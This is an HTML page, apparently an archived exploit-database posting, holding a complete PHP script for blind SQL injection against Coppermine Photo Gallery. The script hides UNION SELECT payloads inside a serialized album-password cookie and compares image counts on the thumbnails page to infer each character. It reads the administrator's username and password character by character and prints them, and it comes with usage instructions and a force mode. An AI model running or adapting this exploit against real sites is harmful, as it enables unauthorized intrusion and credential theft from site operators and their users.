<html><head><title>Coppermine Photo Gallery <= 1.4.14 Remote SQL Injection Exploit</title></head><pre>&lt;?php
#############################################
# RST/GHC PRIVATE 
# CPG 1.4.10 sql injection exploit
# Date: 17.05.07
# bug: SQL injection in private album
# function through array indexes with COOKIE 
#############################################
error_reporting (E_ERROR);
ini_set(&quot;max_execution_time&quot;,0);
intro();
if ($argc &lt; 4 ){
        print &quot; Usage: &quot; . $argv[0] . &quot; &lt;host&gt; &lt;dir&gt; &lt;force&gt; [table prefix]\n&quot;;
        print &quot;        &lt;host&gt;                          - hostname\n&quot;;           
        print &quot;        &lt;dir&gt;                           - web dirname \n&quot;;           
        print &quot;        &lt;force&gt;                         - force mode - '0' - for Off or \&quot;album number\&quot; for force mode On \n&quot;;           
        print &quot;        [table prefix]          - prefix of sql tables\n&quot;;           
        print &quot; example: &quot; . $argv[0] . &quot; coppermine.site photo/ 1 cpg1410\n&quot;;
        credits();
}
###############################################
/* FUNCTIONS */
##############################################

if (!function_exists(str_split)){ ### for PHP4 &lt;&lt; FIX
        function str_split($str)
      {
        $str_array=array(); 
        $len=strlen($str);
        for($i=0;$i&lt;$len;$i++) $str_array[]=$str{$i};
        return $str_array;
       }
}

function toSql($str){
        $a_str = str_split ($str);
        $s_str = '0x';
        foreach ($a_str as $val){
                $s_str .= sprintf(&quot;%X&quot;,ord($val));
        }
        return $s_str;
}

function toCookie ($str){
        $str = &quot;-1) UNION SELECT &quot; .toSql ($str). &quot;,1 as md5_password/*&quot;;
        $c_str=array(0=&gt;&quot;8&quot;, $str=&gt;&quot;1&quot;);
        $c_str = $GLOBALS['prefix'].'_albpw='.urlencode(serialize($c_str)).';'.$GLOBALS['cookies'];
        return $c_str;
}


function getAlbum($text){
        if (preg_match(&quot;/(?&lt;=album=)[1-9]{1}(?=\&quot;&gt;)/&quot;, $text, $match)) {
                return intval($match[0]); 
        }
         else return 0;

}

function getCookie($text){
        if (preg_match_all(&quot;/(?&lt;=Set-Cookie:)(.*)(?=expires)/&quot;, $text, $match)) {$cookie = $match[0][0].$match[0][1];}
        else {$cookie = '';}
        return $cookie; 
}

function getPrefix($text){
        if (preg_match(&quot;/(?&lt;=\s)[a-z0-9_]*(?=_data)/&quot;, $text, $match)) return trim($match[0]);
        else return false;
}

function toPage($page){
 $pattern = &quot;/(?&lt;=HTTP).*(?=&lt;html)/s&quot;;
 $replacement = '';
 $page = preg_replace($pattern,$replacement,$page);
 /* Let's count images on the page */
 if (preg_match_all(&quot;/&lt;img/&quot;, $page, $match)) return count($match[0]);
 else return 0;
}

function sendit($page, $method, $cookie=''){
global $argv;
        $data ='';
        $host = $argv[1];
        $page = $argv[2] . $page;
        $referer = 'http://'.$host;
    $user_agent = 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)';
    $result = '';        
        $sock = fsockopen($host, 80, $errno, $errstr, 50);
        if (!$sock) die(&quot;$errstr ($errno)\n&quot;);
        fputs($sock, &quot;$method /$page HTTP/1.0\r\n&quot;);
        fputs($sock, &quot;Host: $host&quot; . &quot;\r\n&quot;);
        fputs($sock, &quot;Content-type: application/x-www-form-urlencoded\r\n&quot;);
        fputs($sock, &quot;Content-length: &quot; . strlen($data) . &quot;\r\n&quot;);
        fputs($sock, &quot;Referer: $referer&quot;. &quot;\r\n&quot;);
        fputs($sock, &quot;User-Agent:  $user_agent&quot; . &quot;\r\n&quot;);        
        fputs($sock, &quot;Accept: */*\r\n&quot;);
        if ($cookie !=='') {fputs($sock, &quot;Cookie: $cookie\r\n&quot;);}
        fputs($sock, &quot;\r\n&quot;);
        fputs($sock, &quot;$data\r\n&quot;);
        fputs($sock, &quot;\r\n&quot;);

    while (!feof($sock)) {
        $result .= fgets ($sock,8192);
    }           
        fclose($sock);
                //print $result; ### DEBUGER
    return $result; 
    
}

function credits(){
echo '
+==========================================+
+ Coded: 17.05.07 * Bug found in Feb.2007  +
+==========================================+
'; 
exit;
}


function intro(){
echo '
          * P R I V A T E  *
+==========================================+
| RST/GHC Coppermine SQL injection exploit |
+==========================================+
|  &gt;&gt;&gt; vulnerable: CPG 1.4.10 stable  &lt;&lt;&lt;  |
+------------------------------------------+
';

}

#####################################################################
### HACK FUNCTIONS
#####
####
### what to find:
## user_name   user_password    FROM  cpg1410_users WHERE user_id=1
####################################################################

function makeExpl($param, $cond, $sn) ### $param - name || password; $cond - condition (e.g. =97) ; $sn  - position 
{
        global $argv;
        $tprefix = (isset($argv[4])) ? $argv[4]  : 'cpg1410';
        $query = 'ASCII(substr((SELECT user_'.$param.' FROM '.$tprefix.'_users WHERE user_id=1),'.$sn.',1))' . $cond;
        $sql = '0) UNION SELECT '.$GLOBALS['album'].' AND ' .$query. '/*'; 
           //echo $sql; ###DEBUG
        return toCookie($sql);

}
//////////////
function blind($param, $sn, $fmin, $fmax)
{
 if (($fmax-$fmin)&lt;5) { return crack($param, $fmin, $fmax, $sn) ;}
 $compare = intval($fmin + ($fmax-$fmin)/2);
 $crcheck = &quot;&gt;&quot;. $compare;
 if ( check(makeExpl($param, $crcheck, $sn)) == 1 ) {
    return blind($param, $sn, $compare, $fmax);
    }
 else {
    return blind($param, $sn, $fmin, $compare+1); 
        }
}

function crack($param, $cmin, $cmax, $sn)
{
 for ($i=$cmin; $i &lt;=$cmax; $i++){
   $crcheck = '='.$i;
   $sqlCookie = makeExpl($param, $crcheck ,$sn);
   if (check($sqlCookie) == 1){print chr($i); return 1;}
         }
return 0;
}

function check($sqlCookie){
        global $page, $etalon;
        $testPage = toPage(sendit ($page, 'GET', $sqlCookie));
        if ($testPage &lt; $etalon) return 1;
        else return 0;
}

function exploit($param){ 
        echo &quot;\nLet's define admin's &quot;. $param . &quot;\n&quot;;
        $min = 48;  # 0
        $max = 122; # z

        $sql_cookies = makeExpl($param,'BETWEEN '.$min . ' AND '.$max,1);
        if (check($sql_cookies) == 0) {echo 'failed...'; return;}

        $sn=1; 
        while(blind($param,$sn, $min, $max) !== 0) {
                $sn++; if ($sn &gt; 32) return;
        }
}

###############################################################
## START     E X P L O I T    C O D E 
#############################################################
echo '
Exploiting:
[+] target: '. $argv[1].'/'.$argv[2].'
';
         $page = '';
        $firstReply = sendit($page, 'GET'); 
        $album = getAlbum($firstReply);                                                                  ### get valid album number
        if ($album == 0) {
                echo &quot;[-] No valid album found...\n&quot;; 
                if ($argv[3] != 0) {echo &quot;... Forcing\n&quot;;        $album = $argv[3];}        ### FOR FORCE MODE!!!! If you know exactly album number - put it here
                else {credits();}                                                                                 
                
        }
        $page = 'thumbnails.php?album='.$album;
        $GLOBALS['album'] = $album;
        echo &quot;[+] Valid album number: &quot;.$album . &quot;\n&quot;;
        
        $GLOBALS['cookies'] = getCookie($firstReply);                                         ### get cookie from host

        $prefix = getPrefix($GLOBALS['cookies']);                                                 ### get cookie prefix
        echo &quot;[+] Cookie prefix: &quot; . $prefix . &quot;\n&quot;;
        $GLOBALS['prefix']=$prefix;
        
        $etalon = toPage(sendit ($page, 'GET', $c_cookies));                         ### number of images at etalon page
        
        $first_sql = '0) UNION SELECT '.$album.' AND 1=1/*';                        ### FIRST sql query - let's make valid album to be invisible
        $first_cookie = toCookie($first_sql);
        
        if (check($first_cookie) == 0) {echo &quot;exploit failed...&quot;; credits();} ### if album is still visible - site is unvulnerable
        exploit('name');
        exploit('password');
        credits();

?&gt;

# milw0rm.com [2008-01-22]</pre></html>